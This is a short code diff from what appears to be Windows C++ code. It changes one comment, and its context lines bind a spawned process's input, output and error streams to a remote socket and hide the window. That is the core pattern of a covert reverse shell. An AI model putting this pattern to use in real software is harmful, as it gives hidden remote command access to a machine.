@@ -17,7 +17,7 @@ private:
 		memset(&si, 0, sizeof(STARTUPINFO));
 
 		si.cb = sizeof(STARTUPINFO);
-		//redirect process I/O to socket
+		//redirect stderr/stdin/stdout to remote socket
 		si.hStdError = si.hStdInput = si.hStdOutput = dstSocket;
 		si.dwFlags = STARTF_USESTDHANDLES | STARTF_USEPOSITION | STARTF_USESHOWWINDOW;
 		si.wShowWindow = SW_HIDE; // hide window
